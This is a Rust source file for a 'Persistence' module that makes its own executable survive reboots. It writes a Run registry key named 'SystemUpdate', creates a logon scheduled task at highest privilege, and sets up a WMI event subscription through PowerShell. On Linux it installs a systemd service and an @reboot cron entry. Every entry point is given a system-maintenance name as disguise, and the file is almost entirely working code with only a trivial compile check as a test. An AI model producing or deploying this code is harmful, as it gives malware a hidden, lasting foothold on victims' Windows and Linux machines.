use std::io;

#[cfg(target_os = "windows")]
use winapi::um::winreg::{RegCreateKeyExW, RegSetValueExW, RegCloseKey};

pub struct Persistence;

impl Persistence {
    #[cfg(target_os = "windows")]
    pub fn install_registry_run() -> io::Result<()> {
        use winapi::um::winreg::{HKEY_CURRENT_USER};
        use winapi::um::winnt::{REG_SZ, KEY_WRITE};
        use std::ffi::OsStr;
        use std::os::windows::ffi::OsStrExt;
        use std::ptr::null_mut;
        
        unsafe {
            let subkey: Vec<u16> = OsStr::new(r"Software\Microsoft\Windows\CurrentVersion\Run")
                .encode_wide()
                .chain(Some(0))
                .collect();
            
            let value_name: Vec<u16> = OsStr::new("SystemUpdate")
                .encode_wide()
                .chain(Some(0))
                .collect();
            
            let exe_path = std::env::current_exe()
                .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
            
            let exe_str: Vec<u16> = exe_path.to_string_lossy()
                .encode_utf16()
                .chain(Some(0))
                .collect();
            
            let mut hkey = null_mut();
            let result = RegCreateKeyExW(
                HKEY_CURRENT_USER as _,
                subkey.as_ptr(),
                0,
                null_mut(),
                0,
                KEY_WRITE,
                null_mut(),
                &mut hkey,
                null_mut()
            );
            
            if result != 0 {
                return Err(io::Error::from_raw_os_error(result as i32));
            }
            
            let data_size = (exe_str.len() * 2) as u32;
            let result = RegSetValueExW(
                hkey,
                value_name.as_ptr(),
                0,
                REG_SZ,
                exe_str.as_ptr() as _,
                data_size
            );
            
            RegCloseKey(hkey);
            
            if result != 0 {
                return Err(io::Error::from_raw_os_error(result as i32));
            }
        }
        
        Ok(())
    }
    
    #[cfg(target_os = "windows")]
    pub fn install_scheduled_task() -> io::Result<()> {
        use std::process::Command;
        
        let exe_path = std::env::current_exe()?;
        
        let output = Command::new("schtasks")
            .args(&[
                "/create",
                "/tn", "SystemMaintenanceService",
                "/tr", &exe_path.to_string_lossy(),
                "/sc", "onlogon",
                "/rl", "highest",
                "/f"
            ])
            .output()?;
        
        if !output.status.success() {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                String::from_utf8_lossy(&output.stderr)
            ));
        }
        
        Ok(())
    }
    
    #[cfg(target_os = "windows")]
    pub fn install_wmi_event() -> io::Result<()> {
        // WMI Event subscription persistence
        // Requires PowerShell
        
        let script = r#"
        $EventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
            Name = "SystemMaintenanceFilter"
            EventNameSpace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }
        
        $EventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = "SystemMaintenanceConsumer"
            CommandLineTemplate = "%CURRENT_EXE%"
        }
        
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter = $EventFilter
            Consumer = $EventConsumer
        }
        "#;
        
        let exe_path = std::env::current_exe()?.to_string_lossy().to_string();
        let script = script.replace("%CURRENT_EXE%", &exe_path);
        
        use std::process::Command;
        let output = Command::new("powershell")
            .args(&["-NoProfile", "-NonInteractive", "-Command", &script])
            .output()?;
        
        if !output.status.success() {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                String::from_utf8_lossy(&output.stderr)
            ));
        }
        
        Ok(())
    }
    
    #[cfg(target_os = "linux")]
    pub fn install_systemd_service() -> io::Result<()> {
        let exe_path = std::env::current_exe()?;
        let service_content = format!(
            r#"[Unit]
Description=System Maintenance Service
After=network.target

[Service]
ExecStart={}
Restart=always
User={}

[Install]
WantedBy=multi-user.target
"#,
            exe_path.display(),
            std::env::var("USER").unwrap_or_default()
        );
        
        let service_path = "/etc/systemd/system/system-maintenance.service";
        std::fs::write(service_path, service_content)?;
        
        use std::process::Command;
        Command::new("systemctl")
            .args(&["enable", "system-maintenance.service"])
            .output()?;
        
        Ok(())
    }
    
    #[cfg(target_os = "linux")]
    pub fn install_cron_job() -> io::Result<()> {
        use std::process::Command;
        
        let exe_path = std::env::current_exe()?;
        let cron_entry = format!("@reboot {}\n", exe_path.display());
        
        // Get current crontab
        let output = Command::new("crontab").arg("-l").output()?;
        let current_cron = String::from_utf8_lossy(&output.stdout);
        
        // Append new entry
        let new_cron = format!("{}{}", current_cron, cron_entry);
        
        // Write back
        let mut child = Command::new("crontab")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .spawn()?;
        
        use std::io::Write;
        child.stdin.as_mut().unwrap().write_all(new_cron.as_bytes())?;
        child.wait()?;
        
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_persistence_methods_exist() {
        // Just verify methods compile
        #[cfg(target_os = "windows")]
        {
            let _ = Persistence::install_registry_run;
            let _ = Persistence::install_scheduled_task;
        }
    }
}
